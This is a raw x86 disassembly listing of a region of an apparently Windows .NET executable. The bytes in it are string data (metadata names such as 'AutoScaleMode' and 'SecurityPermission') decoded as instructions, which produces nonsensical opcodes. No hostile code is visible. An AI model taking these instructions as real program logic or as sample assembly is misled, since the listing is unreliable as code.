  406a02:	ins    DWORD PTR es:[edi],dx
  406a03:	push   esi
  406a04:	popa   
  406a05:	ins    BYTE PTR es:[edi],dx
  406a06:	jne    0x406a6d
  406a08:	add    BYTE PTR [eax+0x73],dh
  406a0b:	jp     0x406a5b
  406a0d:	popa   
  406a0e:	ins    DWORD PTR es:[edi],dx
  406a0f:	add    BYTE PTR gs:[eax+0x42],dh
  406a13:	imul   ebp,DWORD PTR [esi+0x64],0x6974704f
  406a1a:	outs   dx,DWORD PTR ds:[esi]
  406a1b:	outs   dx,BYTE PTR ds:[esi]
  406a1c:	jae    0x406a1e
  406a1e:	dec    ecx
  406a1f:	outs   dx,BYTE PTR ds:[esi]
  406a20:	inc    ecx
  406a21:	je     0x406a97
  406a23:	jb     0x406a8e
  406a25:	bound  esi,QWORD PTR [ebp+0x74]
  406a28:	add    BYTE PTR gs:[edx+0x69],dh
  406a2c:	imul   esp,DWORD PTR [eax+eax*1+0x69],0x6174736e
  406a34:	outs   dx,BYTE PTR ds:[esi]
  406a35:	arpl   WORD PTR [ebp+0x0],sp
  406a38:	dec    edi
  406a39:	jne    0x406aaf
  406a3b:	inc    ecx
  406a3c:	je     0x406ab2
  406a3e:	jb     0x406aa9
  406a40:	bound  esi,QWORD PTR [ebp+0x74]
  406a43:	add    BYTE PTR gs:[ebx+0x6c],ah
  406a47:	jae    0x406ab2
  406a49:	add    BYTE PTR fs:[ecx+0x69],ch
  406a4d:	add    BYTE PTR fs:[ecx+0x54],ch
  406a51:	dec    ecx
  406a52:	outs   dx,BYTE PTR ds:[esi]
  406a53:	outs   dx,WORD PTR ds:[esi]
  406a55:	add    BYTE PTR [ebx+eiz*2+0x69],ch
  406a59:	add    BYTE PTR fs:[edx+0x67],dh
  406a5d:	jae    0x406aad
  406a5f:	popa   
  406a60:	ins    DWORD PTR es:[edi],dx
  406a61:	gs jae 0x406a64
  406a64:	arpl   WORD PTR [esi+0x61],cx
  406a67:	ins    DWORD PTR es:[edi],dx
  406a68:	gs jae 0x406a6b
  406a6b:	jb     0x406ad4
  406a6d:	inc    esp
  406a6e:	imul   esi,DWORD PTR [ebx+0x70],0x64006449
  406a75:	imul   esi,DWORD PTR [ebx+0x70],0x654d6449
  406a7c:	ins    DWORD PTR es:[edi],dx
  406a7d:	bound  esp,QWORD PTR [ebp+0x72]
  406a80:	add    BYTE PTR [edi+esi*2+0x46],ah
  406a84:	ins    BYTE PTR es:[edi],dx
  406a85:	popa   
  406a86:	addr16 jae 0x406a89
  406a89:	jo     0x406acf
  406a8b:	imul   esi,DWORD PTR [ebx+0x70],0x61726150
  406a92:	ins    DWORD PTR es:[edi],dx
  406a93:	jae    0x406a95
  406a95:	jo     0x406aed
  406a97:	popa   
  406a98:	jb     0x406aec
  406a9a:	gs jae 0x406b12
  406a9d:	ins    BYTE PTR es:[edi],dx
  406a9e:	je     0x406aa0
  406aa0:	jo     0x406ae7
  406aa2:	js     0x406b07
  406aa4:	gs jo  0x406af0
  406aa7:	outs   dx,BYTE PTR ds:[esi]
  406aa8:	outs   dx,WORD PTR ds:[esi]
  406aaa:	add    BYTE PTR [eax+0x41],dh
  406aad:	jb     0x406b16
  406aaf:	inc    ebp
  406ab0:	jb     0x406b24
  406ab2:	add    BYTE PTR [esi+0x61],dh
  406ab5:	ins    BYTE PTR es:[edi],dx
  406ab6:	jne    0x406b1d
  406ab8:	add    BYTE PTR [ebx+0x74],dh
  406abb:	jb     0x406abd
  406abd:	arpl   WORD PTR [edx+0x0],sp
  406ac0:	jo     0x406b27
  406ac2:	jb     0x406b31
  406ac4:	imul   esi,DWORD PTR [ebx+0x73],0x426e6f69
  406acb:	jns    0x406b41
  406acd:	gs jae 0x406ad0
  406ad0:	jae    0x406b46
  406ad2:	popa   
  406ad3:	jb     0x406b49
  406ad5:	dec    ecx
  406ad6:	outs   dx,BYTE PTR ds:[esi]
  406ad7:	fs gs js 0x406adb
  406adb:	arpl   WORD PTR [edx+0x42],sp
  406ade:	jns    0x406b54
  406ae0:	gs jae 0x406ae3
  406ae3:	jae    0x406b59
  406ae5:	jb     0x406b5c
  406ae7:	arpl   WORD PTR [ebp+esi*2+0x72],si
  406aeb:	add    BYTE PTR gs:[ebp+eiz*2+0x6c],ah
  406af0:	gs je  0x406b58
  406af3:	dec    edi
  406af4:	ins    BYTE PTR es:[edi],dx
  406af5:	add    BYTE PTR fs:[eax+0x61],ch
  406af9:	outs   dx,BYTE PTR ds:[esi]
  406afa:	fs ins BYTE PTR es:[edi],dx
  406afc:	add    BYTE PTR gs:[ebp+0x73],dh
  406b00:	gs jb  0x406b57
  406b03:	outs   dx,DWORD PTR ds:[esi]
  406b04:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  406b08:	jbe    0x406b6b
  406b0a:	ins    BYTE PTR es:[edi],dx
  406b0b:	imul   esp,DWORD PTR [edi+edx*2+0x69],0x776f646e
  406b13:	jae    0x406b6a
  406b15:	jae    0x406b7c
  406b17:	jb     0x406b19
  406b19:	jo     0x406b7c
  406b1b:	jae    0x406b90
  406b1d:	ja     0x406b8e
  406b1f:	jb     0x406b85
  406b21:	add    BYTE PTR [ebp+0x73],dh
  406b24:	gs jb  0x406b75
  406b27:	popa   
  406b28:	ins    DWORD PTR es:[edi],dx
  406b29:	add    BYTE PTR gs:[ecx+eiz*2+0x72],dh
  406b2e:	addr16 gs je 0x406b75
  406b32:	outs   dx,DWORD PTR ds:[esi]
  406b33:	ins    DWORD PTR es:[edi],dx
  406b34:	jo     0x406bab
  406b36:	je     0x406b9d
  406b38:	jb     0x406b3a
  406b3a:	jo     0x406b9d
  406b3c:	jae    0x406bb1
  406b3e:	ja     0x406baf
  406b40:	jb     0x406ba6
  406b42:	dec    ecx
  406b43:	jae    0x406b8e
  406b45:	outs   dx,BYTE PTR ds:[esi]
  406b46:	jbe    0x406ba9
  406b48:	ins    BYTE PTR es:[edi],dx
  406b49:	imul   esp,DWORD PTR [eax+eax*1+0x64],0x63657269
  406b51:	je     0x406bc2
  406b53:	jb     0x406bce
  406b55:	add    BYTE PTR [esi+0x75],ah
  406b58:	ins    BYTE PTR es:[edi],dx
  406b59:	ins    BYTE PTR es:[edi],dx
  406b5a:	push   ebp
  406b5b:	jae    0x406bc2
  406b5d:	jb     0x406bad
  406b5f:	popa   
  406b60:	ins    DWORD PTR es:[edi],dx
  406b61:	add    BYTE PTR gs:[ebp+0x73],dh
  406b65:	gs fs inc esi
  406b68:	outs   dx,DWORD PTR ds:[esi]
  406b69:	jb     0x406bbb
  406b6b:	popa   
  406b6c:	jae    0x406be1
  406b6e:	ja     0x406bdf
  406b70:	jb     0x406bd6
  406b72:	push   esi
  406b73:	gs jb  0x406bdf
  406b76:	imul   sp,WORD PTR [ebx+0x61],0x6974
  406b7c:	outs   dx,DWORD PTR ds:[esi]
  406b7d:	outs   dx,BYTE PTR ds:[esi]
  406b7e:	add    BYTE PTR [ebp+0x72],ah
  406b81:	jb     0x406bf2
  406b83:	jb     0x406bd2
  406b85:	gs jae 0x406bfb
  406b88:	popa   
  406b89:	add    BYTE PTR gs:[bx+di+0x73],ch
  406b8e:	inc    edi
  406b8f:	jb     0x406c00
  406b91:	jne    0x406c03
  406b93:	add    BYTE PTR [eax+0x53],ch
  406b96:	imul   esp,DWORD PTR [eax+eax*1+0x77],0x6f646e69
  406b9e:	ja     0x406c13
  406ba0:	push   eax
  406ba1:	jb     0x406c0c
  406ba3:	outs   dx,BYTE PTR ds:[esi]
  406ba4:	arpl   WORD PTR [ecx+0x70],bp
  406ba7:	popa   
  406ba8:	ins    BYTE PTR es:[edi],dx
  406ba9:	add    BYTE PTR [edi+0x69],dh
  406bac:	outs   dx,BYTE PTR ds:[esi]
  406bad:	outs   dx,DWORD PTR fs:[esi]
  406baf:	ja     0x406c24
  406bb1:	dec    ecx
  406bb2:	fs outs dx,BYTE PTR gs:[esi]
  406bb5:	je     0x406c20
  406bb7:	je     0x406c32
  406bb9:	add    BYTE PTR [edi+0x72],ah
  406bbc:	outs   dx,DWORD PTR ds:[esi]
  406bbd:	jne    0x406c2f
  406bbf:	dec    esi
  406bc0:	popa   
  406bc1:	ins    DWORD PTR es:[edi],dx
  406bc2:	add    BYTE PTR gs:[edi+ebp*2+0x6b],dl
  406bc7:	outs   dx,BYTE PTR gs:[esi]
  406bc9:	dec    eax
  406bca:	popa   
  406bcb:	outs   dx,BYTE PTR ds:[esi]
  406bcc:	fs ins BYTE PTR es:[edi],dx
  406bce:	add    BYTE PTR gs:[edi+ebp*2+0x6b],dl
  406bd3:	outs   dx,BYTE PTR gs:[esi]
  406bd5:	dec    ecx
  406bd6:	outs   dx,BYTE PTR ds:[esi]
  406bd7:	outs   dx,WORD PTR ds:[esi]
  406bd9:	jb     0x406c48
  406bdb:	popa   
  406bdc:	je     0x406c47
  406bde:	outs   dx,DWORD PTR ds:[esi]
  406bdf:	outs   dx,BYTE PTR ds:[esi]
  406be0:	inc    ebx
  406be1:	ins    BYTE PTR es:[edi],dx
  406be2:	popa   
  406be3:	jae    0x406c58
  406be5:	add    BYTE PTR [edi+ebp*2+0x6b],dl
  406be9:	outs   dx,BYTE PTR gs:[esi]
  406beb:	dec    ecx
  406bec:	outs   dx,BYTE PTR ds:[esi]
  406bed:	outs   dx,WORD PTR ds:[esi]
  406bef:	jb     0x406c5e
  406bf1:	popa   
  406bf2:	je     0x406c5d
  406bf4:	outs   dx,DWORD PTR ds:[esi]
  406bf5:	outs   dx,BYTE PTR ds:[esi]
  406bf6:	add    BYTE PTR [edi+ebp*2+0x6b],dl
  406bfa:	outs   dx,BYTE PTR gs:[esi]
  406bfc:	dec    ecx
  406bfd:	outs   dx,BYTE PTR ds:[esi]
  406bfe:	outs   dx,WORD PTR ds:[esi]
  406c00:	jb     0x406c6f
  406c02:	popa   
  406c03:	je     0x406c6e
  406c05:	outs   dx,DWORD PTR ds:[esi]
  406c06:	outs   dx,BYTE PTR ds:[esi]
  406c07:	dec    esp
  406c08:	outs   dx,BYTE PTR gs:[esi]
  406c0a:	addr16 je 0x406c75
  406c0d:	add    BYTE PTR [edx+0x65],dl
  406c10:	je     0x406c87
  406c12:	jb     0x406c82
  406c14:	dec    esp
  406c15:	outs   dx,BYTE PTR gs:[esi]
  406c17:	addr16 je 0x406c82
  406c1a:	add    BYTE PTR [eax+esi*2+0x73],ch
  406c1e:	jp     0x406c75
  406c20:	jae    0x406c87
  406c22:	jb     0x406c92
  406c24:	popa   
  406c25:	ins    DWORD PTR es:[edi],dx
  406c26:	add    BYTE PTR gs:[eax+esi*2+0x73],ch
  406c2b:	jp     0x406c71
  406c2d:	outs   dx,DWORD PTR ds:[esi]
  406c2e:	ins    DWORD PTR es:[edi],dx
  406c2f:	popa   
  406c30:	imul   ebp,DWORD PTR [esi+0x0],0x7a73706c
  406c37:	push   eax
  406c38:	popa   
  406c39:	jae    0x406cae
  406c3b:	ja     0x406cac
  406c3d:	jb     0x406ca3
  406c3f:	add    BYTE PTR [edi+esi*2+0x4c],ah
  406c43:	outs   dx,DWORD PTR ds:[esi]
  406c44:	outs   dx,DWORD PTR ds:[si]
  406c46:	outs   dx,BYTE PTR ds:[esi]
  406c47:	push   esp
  406c48:	jns    0x406cba
  406c4a:	add    BYTE PTR gs:[edi+esi*2+0x4c],ah
  406c4f:	outs   dx,DWORD PTR ds:[esi]
  406c50:	outs   dx,DWORD PTR ds:[si]
  406c52:	outs   dx,BYTE PTR ds:[esi]
  406c53:	push   eax
  406c54:	jb     0x406cc5
  406c56:	jbe    0x406cc1
  406c58:	fs gs jb 0x406c5c
  406c5c:	jo     0x406cc6
  406c5e:	push   esp
  406c5f:	outs   dx,DWORD PTR ds:[esi]
  406c60:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  406c64:	ins    BYTE PTR es:[edi],dx
  406c65:	jo     0x406cba
  406c67:	jns    0x406cdc
  406c69:	je     0x406cd0
  406c6b:	ins    DWORD PTR es:[edi],dx
  406c6c:	dec    esi
  406c6d:	popa   
  406c6e:	ins    DWORD PTR es:[edi],dx
  406c6f:	add    BYTE PTR gs:[eax+esi*2+0x41],ch
  406c74:	arpl   WORD PTR [ebx+0x6f],sp
  406c77:	jne    0x406ce7
  406c79:	je     0x406cc9
  406c7b:	popa   
  406c7c:	ins    DWORD PTR es:[edi],dx
  406c7d:	add    BYTE PTR gs:[eax+0x53],dh
  406c81:	imul   esp,DWORD PTR [eax+eax*1+0x63],0x64695362
  406c89:	add    BYTE PTR [edi+ebp*2+0x6d],ah
  406c8d:	popa   
  406c8e:	imul   ebp,DWORD PTR [esi+0x4e],0x656d61
  406c95:	arpl   WORD PTR [edx+0x64],sp
  406c98:	outs   dx,DWORD PTR ds:[esi]
  406c99:	ins    DWORD PTR es:[edi],dx
  406c9a:	popa   
  406c9b:	imul   ebp,DWORD PTR [esi+0x4c],0x74676e65
  406ca2:	push   0x55657000
  406ca7:	jae    0x406d0e
  406ca9:	add    BYTE PTR [ebx+0x79],dh
  406cac:	jae    0x406d22
  406cae:	gs ins DWORD PTR es:[edi],dx
  406cb0:	add    BYTE PTR [eax+0x74],dh
  406cb3:	jb     0x406d08
  406cb5:	dec    ecx
  406cb6:	inc    esp
  406cb7:	add    BYTE PTR [esi+0x61],ch
  406cba:	ins    DWORD PTR es:[edi],dx
  406cbb:	add    BYTE PTR gs:[esi+0x61],ch
  406cbf:	ins    DWORD PTR es:[edi],dx
  406cc0:	gs push ebx
  406cc2:	imul   edi,DWORD PTR [edx+0x65],0x6d6f6400
  406cc9:	popa   
  406cca:	imul   ebp,DWORD PTR [esi+0x0],0x616d6f64
  406cd1:	imul   ebp,DWORD PTR [esi+0x53],0x657a69
  406cd8:	jne    0x406d4d
  406cda:	add    BYTE PTR gs:[ebx+0x65],dh
  406cde:	jb     0x406d56
  406ce0:	gs jb  0x406d51
  406ce3:	popa   
  406ce4:	ins    DWORD PTR es:[edi],dx
  406ce5:	add    BYTE PTR gs:[edi+0x72],ah
  406ce9:	outs   dx,DWORD PTR ds:[esi]
  406cea:	jne    0x406d5c
  406cec:	outs   dx,BYTE PTR ds:[esi]
  406ced:	popa   
  406cee:	ins    DWORD PTR es:[edi],dx
  406cef:	add    BYTE PTR gs:[ebp+eiz*2+0x76],ch
  406cf4:	gs ins BYTE PTR es:[edi],dx
  406cf6:	add    BYTE PTR [edi+ebp*2+0x74],dh
  406cfa:	popa   
  406cfb:	ins    BYTE PTR es:[edi],dx
  406cfc:	outs   dx,BYTE PTR gs:[esi]
  406cfe:	je     0x406d72
  406d00:	imul   esp,DWORD PTR [ebp+0x73],0x66756200
  406d07:	jo     0x406d7d
  406d09:	jb     0x406d0b
  406d0b:	jne    0x406d80
  406d0d:	gs jb  0x406d7e
  406d10:	popa   
  406d11:	ins    DWORD PTR es:[edi],dx
  406d12:	add    BYTE PTR gs:[ebx+0x65],dl
  406d16:	jb     0x406d8e
  406d18:	gs jb  0x406d69
  406d1b:	popa   
  406d1c:	ins    DWORD PTR es:[edi],dx
  406d1d:	add    BYTE PTR gs:[ecx+0x75],dl
  406d21:	popa   
  406d22:	ins    BYTE PTR es:[edi],dx
  406d23:	imul   esp,DWORD PTR [esi+0x69],0x56007265
  406d2a:	popa   
  406d2b:	ins    BYTE PTR es:[edi],dx
  406d2c:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x546e6f69
  406d34:	jns    0x406da6
  406d36:	add    BYTE PTR gs:[ecx+0x6e],cl
  406d3a:	jo     0x406db1
  406d3c:	je     0x406d7f
  406d3e:	jb     0x406da7
  406d40:	add    BYTE PTR [edi+0x75],cl
  406d43:	je     0x406db5
  406d45:	jne    0x406dbb
  406d47:	inc    ecx
  406d48:	jb     0x406db1
  406d4a:	add    BYTE PTR [eax+0x49],dh
  406d4d:	fs outs dx,BYTE PTR gs:[esi]
  406d50:	je     0x406dbb
  406d52:	imul   sp,WORD PTR [ebp+0x72],0x7541
  406d58:	je     0x406dc2
  406d5a:	outs   dx,DWORD PTR ds:[esi]
  406d5b:	jb     0x406dc6
  406d5d:	je     0x406dd8
  406d5f:	add    BYTE PTR [esi+0x53],ch
  406d62:	jne    0x406dc6
  406d64:	inc    ecx
  406d65:	jne    0x406ddb
  406d67:	push   0x7469726f
  406d6c:	jns    0x406db1
  406d6e:	outs   dx,DWORD PTR ds:[esi]
  406d6f:	jne    0x406ddf
  406d71:	je     0x406d73
  406d73:	fs ja  0x406dc9
  406d76:	jne    0x406dda
  406d78:	inc    ecx
  406d79:	jne    0x406def
  406d7b:	push   0x7469726f
  406d80:	jns    0x406db2
  406d82:	add    BYTE PTR [edi+esi*2+0x53],ah
  406d86:	jne    0x406dea
  406d88:	inc    ecx
  406d89:	jne    0x406dff
  406d8b:	push   0x7469726f
  406d90:	jns    0x406dc3
  406d92:	add    BYTE PTR [edi+esi*2+0x53],ah
  406d96:	jne    0x406dfa
  406d98:	inc    ecx
  406d99:	jne    0x406e0f
  406d9b:	push   0x7469726f
  406da0:	jns    0x406dd4
  406da2:	add    BYTE PTR [edi+esi*2+0x53],ah
  406da6:	jne    0x406e0a
  406da8:	inc    ecx
  406da9:	jne    0x406e1f
  406dab:	push   0x7469726f
  406db0:	jns    0x406de5
  406db2:	add    BYTE PTR [edi+esi*2+0x53],ah
  406db6:	jne    0x406e1a
  406db8:	inc    ecx
  406db9:	jne    0x406e2f
  406dbb:	push   0x7469726f
  406dc0:	jns    0x406df6
  406dc2:	add    BYTE PTR [edi+esi*2+0x53],ah
  406dc6:	jne    0x406e2a
  406dc8:	inc    ecx
  406dc9:	jne    0x406e3f
  406dcb:	push   0x7469726f
  406dd0:	jns    0x406e07
  406dd2:	add    BYTE PTR [edi+esi*2+0x53],ah
  406dd6:	jne    0x406e3a
  406dd8:	inc    ecx
  406dd9:	jne    0x406e4f
  406ddb:	push   0x7469726f
  406de0:	jns    0x406e18
  406de2:	add    BYTE PTR [edi+esi*2+0x53],ah
  406de6:	jne    0x406e4a
  406de8:	inc    ecx
  406de9:	jne    0x406e5f
  406deb:	push   0x7469726f
  406df0:	jns    0x406e29
  406df2:	add    BYTE PTR [ebx+0x69],dl
  406df5:	fs push esp
  406df7:	outs   dx,DWORD PTR ds:[esi]
  406df8:	inc    ebx
  406df9:	push   0x6b6365
  406dfe:	dec    ecx
  406dff:	jae    0x406e4e
  406e01:	gs ins DWORD PTR es:[edi],dx
  406e03:	bound  esp,QWORD PTR [ebp+0x72]
  406e06:	add    BYTE PTR [ebp+0x78],al
  406e09:	imul   esi,DWORD PTR [ebx+0x74],0x54676e69
  406e10:	outs   dx,DWORD PTR ds:[esi]
  406e11:	imul   esp,DWORD PTR [ebp+0x6e],0x48
  406e15:	popa   
  406e16:	outs   dx,BYTE PTR ds:[esi]
  406e17:	fs ins BYTE PTR es:[edi],dx
  406e19:	add    BYTE PTR gs:[ebp+esi*2+0x70],al
  406e1e:	ins    BYTE PTR es:[edi],dx
  406e1f:	imul   esp,DWORD PTR [ebx+0x61],0x6f546574
  406e26:	imul   esp,DWORD PTR [ebp+0x6e],0x48
  406e2a:	popa   
  406e2b:	outs   dx,BYTE PTR ds:[esi]
  406e2c:	fs ins BYTE PTR es:[edi],dx
  406e2e:	add    BYTE PTR gs:[esi+0x61],cl
  406e32:	ins    DWORD PTR es:[edi],dx
  406e33:	gs push esp
  406e35:	jns    0x406ea7
  406e37:	add    BYTE PTR gs:[eax+esi*2+0x42],ch
  406e3c:	jne    0x406ea4
  406e3e:	data16 gs jb 0x406e42
  406e42:	ins    BYTE PTR es:[edi],dx
  406e43:	jo     0x406eb3
  406e45:	push   ebx
  406e46:	imul   edi,DWORD PTR [edx+0x65],0x61687300
  406e4d:	jb     0x406eb4
  406e4f:	push   eax
  406e50:	popa   
  406e51:	je     0x406ebb
  406e53:	add    BYTE PTR [ebp+0x78],ah
  406e56:	imul   esi,DWORD PTR [ebx+0x74],0x74754273
  406e5d:	inc    ecx
  406e5e:	arpl   WORD PTR [ebx+0x65],sp
  406e61:	jae    0x406ed6
  406e63:	inc    esp
  406e64:	outs   dx,BYTE PTR gs:[esi]
  406e66:	imul   esp,DWORD PTR [ebp+0x64],0x6c696600
  406e6d:	add    BYTE PTR gs:[ebx+0x75],dh
  406e71:	jo     0x406ee3
  406e73:	outs   dx,DWORD PTR ds:[esi]
  406e74:	jb     0x406eea
  406e76:	jae    0x406ebd
  406e78:	outs   dx,BYTE PTR ds:[esi]
  406e79:	jbe    0x406ee4
  406e7b:	jb     0x406eec
  406e7d:	outs   dx,BYTE PTR ds:[esi]
  406e7e:	ins    DWORD PTR es:[edi],dx
  406e7f:	outs   dx,BYTE PTR gs:[esi]
  406e81:	je     0x406ed9
  406e83:	popa   
  406e84:	jb     0x406eef
  406e86:	popa   
  406e87:	bound  ebp,QWORD PTR [ebp+eiz*2+0x73]
  406e8b:	add    BYTE PTR [ebx+0x75],dh
  406e8e:	jo     0x406f00
  406e90:	outs   dx,DWORD PTR ds:[esi]
  406e91:	jb     0x406f07
  406e93:	jae    0x406eea
  406e95:	outs   dx,BYTE PTR ds:[esi]
  406e96:	arpl   WORD PTR [ebx+0x68],dx
  406e99:	popa   
  406e9a:	jb     0x406f01
  406e9c:	jae    0x406e9e
  406e9e:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  406ea5:	inc    ebx
  406ea6:	push   0x63617261
  406eab:	je     0x406f12
  406ead:	jb     0x406f22
  406eaf:	add    BYTE PTR [ebp+0x6e],ah
  406eb2:	jbe    0x406f1d
  406eb4:	jb     0x406f25
  406eb6:	outs   dx,BYTE PTR ds:[esi]
  406eb7:	ins    DWORD PTR es:[edi],dx
  406eb8:	outs   dx,BYTE PTR gs:[esi]
  406eba:	je     0x406f12
  406ebc:	popa   
  406ebd:	jb     0x406f28
  406ebf:	popa   
  406ec0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x73]
  406ec4:	push   eax
  406ec5:	jb     0x406f2c
  406ec7:	jae    0x406f2e
  406ec9:	outs   dx,BYTE PTR ds:[esi]
  406eca:	je     0x406ecc
  406ecc:	jne    0x406f3c
  406ece:	arpl   WORD PTR [ebx+0x68],dx
  406ed1:	popa   
  406ed2:	jb     0x406f39
  406ed4:	push   eax
  406ed5:	jb     0x406f3c
  406ed7:	jae    0x406f3e
  406ed9:	outs   dx,BYTE PTR ds:[esi]
  406eda:	je     0x406edc
  406edc:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  406ee3:	push   ebp
  406ee4:	outs   dx,BYTE PTR ds:[esi]
  406ee5:	arpl   WORD PTR [eax+0x61],dx
  406ee8:	je     0x406f52
  406eea:	add    BYTE PTR [esi+0x69],ah
  406eed:	ins    BYTE PTR es:[edi],dx
  406eee:	gs dec esi
  406ef0:	popa   
  406ef1:	ins    DWORD PTR es:[edi],dx
  406ef2:	add    BYTE PTR gs:[ecx+0x62],ah
  406ef6:	jae    0x406f67
  406ef8:	ins    BYTE PTR es:[edi],dx
  406ef9:	jne    0x406f6f
  406efb:	gs inc esi
  406efd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x687461
  406f05:	outs   dx,BYTE PTR ds:[esi]
  406f06:	gs je  0x406f77
  406f09:	popa   
  406f0a:	ins    DWORD PTR es:[edi],dx
  406f0b:	add    BYTE PTR gs:[esi+0x65],cl
  406f0f:	jne    0x406f85
  406f11:	jb     0x406f74
  406f13:	ins    BYTE PTR es:[edi],dx
  406f14:	push   edx
  406f15:	gs jae 0x406f87
  406f18:	jne    0x406f8c
  406f1a:	arpl   WORD PTR [ebp+0x73],sp
  406f1d:	dec    esp
  406f1e:	popa   
  406f1f:	outs   dx,BYTE PTR ds:[esi]
  406f20:	addr16 jne 0x406f84
  406f23:	addr16 gs inc ecx
  406f26:	je     0x406f9c
  406f28:	jb     0x406f93
  406f2a:	bound  esi,QWORD PTR [ebp+0x74]
  406f2d:	add    BYTE PTR gs:[ebx+0x6f],al
  406f31:	ins    DWORD PTR es:[edi],dx
  406f32:	push   esi
  406f33:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  406f3a:	je     0x406fb0
  406f3c:	jb     0x406fa7
  406f3e:	bound  esi,QWORD PTR [ebp+0x74]
  406f41:	add    BYTE PTR gs:[ebx+0x79],dl
  406f45:	jae    0x406fbb
  406f47:	gs ins DWORD PTR es:[edi],dx
  406f49:	cs push edx
  406f4b:	gs data16 ins BYTE PTR es:[edi],dx
  406f4e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406f53:	outs   dx,BYTE PTR ds:[esi]
  406f54:	add    BYTE PTR [ecx+0x73],al
  406f57:	jae    0x406fbe
  406f59:	ins    DWORD PTR es:[edi],dx
  406f5a:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  406f5e:	gs jb  0x406fd4
  406f61:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  406f68:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  406f6f:	jae    0x406fe4
  406f71:	gs ins DWORD PTR es:[edi],dx
  406f73:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  406f77:	jb     0x406fe8
  406f79:	fs jne 0x406fdf
  406f7c:	je     0x406fbf
  406f7e:	je     0x406ff4
  406f80:	jb     0x406feb
  406f82:	bound  esi,QWORD PTR [ebp+0x74]
  406f85:	add    BYTE PTR gs:[ecx+0x73],al
  406f89:	jae    0x406ff0
  406f8b:	ins    DWORD PTR es:[edi],dx
  406f8c:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  406f90:	outs   dx,DWORD PTR ds:[esi]
  406f91:	jo     0x40700c
  406f93:	jb     0x406ffe
  406f95:	addr16 push 0x74744174
  406f9b:	jb     0x407006
  406f9d:	bound  esi,QWORD PTR [ebp+0x74]
  406fa0:	add    BYTE PTR gs:[ecx+0x73],al
  406fa4:	jae    0x40700b
  406fa6:	ins    DWORD PTR es:[edi],dx
  406fa7:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  406fab:	outs   dx,DWORD PTR ds:[esi]
  406fac:	ins    DWORD PTR es:[edi],dx
  406fad:	jo     0x407010
  406faf:	outs   dx,BYTE PTR ds:[esi]
  406fb0:	jns    0x406ff3
  406fb2:	je     0x407028
  406fb4:	jb     0x40701f
  406fb6:	bound  esi,QWORD PTR [ebp+0x74]
  406fb9:	add    BYTE PTR gs:[ecx+0x73],al
  406fbd:	jae    0x407024
  406fbf:	ins    DWORD PTR es:[edi],dx
  406fc0:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  406fc4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  406fcc:	outs   dx,DWORD PTR ds:[esi]
  406fcd:	outs   dx,BYTE PTR ds:[esi]
  406fce:	inc    ecx
  406fcf:	je     0x407045
  406fd1:	jb     0x40703c
  406fd3:	bound  esi,QWORD PTR [ebp+0x74]
  406fd6:	add    BYTE PTR gs:[ecx+0x73],al
  406fda:	jae    0x407041
  406fdc:	ins    DWORD PTR es:[edi],dx
  406fdd:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  406fe1:	gs jns 0x40702a
  406fe4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  406fec:	bound  esi,QWORD PTR [ebp+0x74]
  406fef:	add    BYTE PTR gs:[ecx+0x73],al
  406ff3:	jae    0x40705a
  406ff5:	ins    DWORD PTR es:[edi],dx
  406ff6:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  406ffa:	gs ins BYTE PTR es:[edi],dx
  406ffc:	popa   
  406ffd:	jns    0x407052
  406fff:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  407006:	imul   esp,DWORD PTR [edx+0x75],0x43006574
  40700d:	dec    esp
  40700e:	push   ebx
  40700f:	inc    ebx
  407010:	outs   dx,DWORD PTR ds:[esi]
  407011:	ins    DWORD PTR es:[edi],dx
  407012:	jo     0x407080
  407014:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  40701b:	jb     0x407086
  40701d:	bound  esi,QWORD PTR [ebp+0x74]
  407020:	add    BYTE PTR gs:[ecx+0x73],al
  407024:	jae    0x40708b
  407026:	ins    DWORD PTR es:[edi],dx
  407027:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40702b:	gs jae 0x407091
  40702e:	jb     0x407099
  407030:	jo     0x4070a6
  407032:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407039:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  407040:	jns    0x4070b5
  407042:	je     0x4070a9
  407044:	ins    DWORD PTR es:[edi],dx
  407045:	cs push ebx
  407047:	arpl   WORD PTR gs:[ebp+0x72],si
  40704b:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  407053:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  40705a:	add    BYTE PTR [ebx+0x65],dl
  40705d:	arpl   WORD PTR [ebp+0x72],si
  407060:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  407068:	jae    0x4070dd
  40706a:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407071:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  407078:	arpl   WORD PTR gs:[ebp+0x72],si
  40707c:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  407084:	outs   dx,BYTE PTR ds:[esi]
  407085:	add    BYTE PTR [ebx+0x79],dl
  407088:	jae    0x4070fe
  40708a:	gs ins DWORD PTR es:[edi],dx
  40708c:	cs inc esp
  40708e:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407095:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  40709c:	jne    0x407105
  40709e:	addr16 popa 
  4070a0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4070a4:	je     0x40711a
